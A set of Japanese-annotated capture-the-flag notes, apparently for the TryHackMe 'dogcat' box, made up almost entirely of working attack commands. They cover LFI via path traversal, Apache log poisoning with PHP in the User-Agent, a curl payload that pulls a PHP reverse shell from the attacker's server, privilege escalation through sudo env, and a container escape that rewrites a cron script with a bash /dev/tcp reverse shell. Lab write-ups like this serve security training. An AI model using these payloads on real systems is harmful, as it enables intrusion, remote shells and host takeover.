@@ -1,0 +1,100 @@
+nmap -sC -sV -oN nmap.log 10.49.172.250
+
+gobuster dir -u http://10.49.172.250 -w /usr/share/wordlists/dirb/common.txt -x php -t 50 | tee gobuster.log
+
+http://10.49.172.250/?view=dog/../../../../../etc/passwd
+
+http://10.49.172.250/?view=php://filter/convert.base64-encode/resource=dog/../index
+
+echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
+
+LFI:
+http://10.49.172.250/?view=dog/../../../../../etc/passwd&ext=
+
+ログポイズニング:
+ログを読み込んだときにPHPコードが実行されるようにする
+
+http://10.49.172.250/?view=dog/../../../../../var/log/apache2/access.log&ext=
+
+curl --user-agent "<?php system('id');?>" http://10.49.172.250
+192.168.141.239 - - [30/Mar/2026:12:28:09 +0000] "GET / HTTP/1.1" 200 615 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+python3 -m http.server 8081
+
+リバースシェルのダウンロード＆配置（User-Agentにphpコード仕込み）:
+curl --user-agent "<?php file_put_contents('/tmp/shell.php',file_get_contents('http://192.168.141.239:8081/php-reverse-shell.php'));?>" http://10.49.172.250
+
+ログをincludeしてPHP実行:
+http://10.49.172.250/?view=dog/../../../../../var/log/apache2/access.log&ext=
+
+ncで待ち受け:
+nc -lvnp 1234
+
+シェル実行:
+http://10.49.172.250/?view=dog/../../../../../tmp/shell&ext=.php   
+
+========================================
+リバースシェル手順（正しい順番で実行）
+========================================
+
+# ターミナル1: HTTPサーバー起動（php-reverse-shell.phpがあるディレクトリで）
+cd ~/thm/dogcat
+python3 -m http.server 8081
+
+# ターミナル2: リスナー起動
+nc -lvnp 1234
+
+# ターミナル3: 以下を順番に実行
+
+# ステップ① User-AgentにPHPコードを注入
+curl --user-agent "<?php file_put_contents('/tmp/shell.php',file_get_contents('http://192.168.141.239:8081/php-reverse-shell.php'));?>" http://10.49.172.250
+
+# ステップ② ログをincludeしてPHP実行（シェルがダウンロードされる）
+# ※ ターミナル1にGET /php-reverse-shell.phpのログが出ればOK
+curl "http://10.49.172.250/?view=dog/../../../../../var/log/apache2/access.log&ext="
+
+# ステップ③ ダウンロードされたシェルを実行（ncに接続が来る）
+curl "http://10.49.172.250/?view=dog/../../../../../tmp/shell&ext=.php"
+
+# 確認: php-reverse-shell.phpのIP/ポートが正しいか
+grep -E '\$ip|\$port' ~/thm/dogcat/php-reverse-shell.php
+# $ip = '192.168.141.239'  $port = 1234 であること
+
+
+sudo -l
+  (root) NOPASSWD: /usr/bin/env
+
+sudo /usr/bin/env /bin/sh
+
+find / -name "flag*" -o -name "*.txt" 2>/dev/null | head -20
+
+========================================
+フラグ
+========================================
+flag1: cat /var/www/html/flag.php
+flag2: cat /var/www/flag2_QMW7JvaY2LvK.txt
+flag3: THM{D1ff3r3nt_3nv1ronments_874112}  (/root/flag3.txt)
+
+========================================
+flag4: コンテナエスケープ
+========================================
+# ホスト名が 03a666d09fe7 → Dockerコンテナ内
+
+# 脱出口を探す
+ls -la /opt/backups
+# backup.tar が 12:10 → cronで定期実行されている
+cat /opt/backups/backup.sh
+# #!/bin/bash
+# tar cf /root/container/backup/backup.tar /root/container
+# → ホスト側の /root/container がコンテナにマウントされている
+
+# Kali側で別ポートでリスナー起動
+nc -lvnp 4444
+
+# コンテナ内でbackup.shを書き換え（ホストのcronがこれを実行→ホストのシェルが来る）
+echo '#!/bin/bash\nbash -i >& /dev/tcp/192.168.141.239/4444 0>&1' > /opt/backups/backup.sh
+
+# 1〜2分待つ → nc に接続が来たら：
+find / -name "flag4*" 2>/dev/null
+cat /flag4.txt
